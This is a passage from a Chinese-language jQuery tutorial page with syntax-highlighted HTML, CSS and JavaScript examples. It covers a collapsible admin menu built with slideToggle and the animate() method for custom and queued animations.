punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>香蕉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>橘子<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>柚子<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>梨<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实现一个层级菜单</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>层级菜单<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">     <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.level1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">siblings</span><span class="token punctuation">(</span><span class="token string">'li'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slideToggle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">     <span class="token selector">body </span><span class="token punctuation">{</span>         <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"YaHei Consolas Hybrid"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector">body,     ul </span><span class="token punctuation">{</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector">ul </span><span class="token punctuation">{</span>         <span class="token property">list-style</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector">a </span><span class="token punctuation">{</span>         <span class="token property">text-decoration</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>         <span class="token property">color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.box</span> </span><span class="token punctuation">{</span>         <span class="token property">height</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>         <span class="token property">width</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>         <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>         <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.topBox</span> </span><span class="token punctuation">{</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">53</span>px<span class="token punctuation">;</span>         <span class="token property">width</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>         <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>         <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">53</span>px<span class="token punctuation">;</span>         <span class="token property">color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>         <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#333</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.topBox</span> span </span><span class="token punctuation">{</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">53</span>px<span class="token punctuation">;</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">50</span>px<span class="token punctuation">;</span>         <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.topBox</span> a </span><span class="token punctuation">{</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">53</span>px<span class="token punctuation">;</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>         <span class="token property">float</span><span class="token punctuation">:</span> right<span class="token punctuation">;</span>         <span class="token property">color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.leftBox</span> </span><span class="token punctuation">{</span>         <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">15%</span><span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>         <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>         <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid gray<span class="token punctuation">;</span>         <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.leftBox</span> <span class="token class">.menu</span> </span><span class="token punctuation">{</span>         <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>         <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.leftBox</span> <span class="token class">.menu</span> <span class="token class">.level1</span> </span><span class="token punctuation">{</span>         <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">42</span>px<span class="token punctuation">;</span>         <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">42</span>px<span class="token punctuation">;</span>         <span class="token property">text-decoration</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>         <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#222</span><span class="token punctuation">;</span>         <span class="token property">color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>         <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">20</span>px<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.menu</span> <span class="token class">.level1</span> li </span><span class="token punctuation">{</span>         <span class="token property">border-top</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid white<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.leftBox</span> <span class="token class">.menu</span> li ul li </span><span class="token punctuation">{</span>         <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">42</span>px<span class="token punctuation">;</span>         <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">42</span>px<span class="token punctuation">;</span>         <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#444</span><span class="token punctuation">;</span>         <span class="token property">color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>         <span class="token property">border-top</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid white<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token comment" spellcheck="true">/* .leftBox .menu li a {         text-decoration: none;     }      */</span>     <span class="token selector"><span class="token class">.rightBox</span> </span><span class="token punctuation">{</span>         <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">83%</span><span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>         <span class="token property">float</span><span class="token punctuation">:</span> right<span class="token punctuation">;</span>         <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid gray<span class="token punctuation">;</span>     <span class="token punctuation">}</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>topBox<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>CMS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>退出后台<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>leftBox<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>menu<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>level1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文档管理<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文档列表<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>创建文档<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>level1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>图片管理<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>图片列表<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>创建图片<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>level1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>网站设置<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>基础设置<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>邮箱设置<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>level1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>用户管理<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>用户列表<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>权限设置<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>level1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>图片管理<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>图片列表<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>创建图片<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rightBox<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         test     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="2-动画"><a href="#2-动画" class="headerlink" title="2.动画"></a>2.动画</h3><blockquote><p><code>jQuery animate()</code> 方法运行自定义动画.</p><p>语法:</p><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">$(selector).animate({params},speed,callback);// params 定义形成动画的css 属性,可以定义多个属性// speed: 可以指定时间,单位是毫秒,也可以指定 slow, mormal, fast// callback 参数指定动画完成后执行的函数名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>[^注意]: <code>animate()</code> 可以操作几乎所有的<code>css</code> 属性,但是使用属性名时必须使用<code>Camel</code> 标记的形式,比如:<code>paddingLeft,marginRight</code> 而不是<code>padding-left,margin-right</code> ,必须使用驼峰式命名的方法.</p><p>实现<code>css</code>属性时可以使用相对值或者绝对值,比如(在值前使用<code>+=或者-=</code>实现):</p><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">$("button").click(function(){$("div").animate({left:'250px',height:'+=150px',width:'+=150px'});});<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>css</code>属性还可以使用默认值<code>show,hide,toggle</code></p><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">$("button").click(function(){$("div").animate({height:'toggle'});});<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>默认情况下,<code>jQuery</code>针对动画提供了队列功能,意味着,可以编写多个<code>animate()</code>,<code>jQuery</code>会逐一调用.</p><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">$("button").click(function(){var div=$("div");div.animate({height:'300px',opacity:'0.4'},"slow");div.animate({width:'300px',opacity:'0.8'},"slow");div.animate({height:'100px',opacity:'0.4'},"slow");div.animate({width:'100px',opacity:'0.8'},"slow");});<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>手风琴效果</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token 